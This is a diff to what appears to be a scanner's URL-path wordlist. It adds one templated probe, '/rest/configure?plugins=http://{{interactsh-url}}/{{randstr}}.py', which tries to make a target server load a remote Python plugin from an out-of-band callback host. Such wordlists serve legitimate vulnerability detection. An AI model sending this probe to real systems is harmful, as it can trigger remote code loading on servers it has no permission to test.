@@ -409,3 +409,4 @@
 /?rest_route=/wpgmza/v1/markers/1/
 /?rest_route=/wpgmza/v1/markers/2/
 /?rest_route=/wpgmza/v1/markers/3/
+/rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
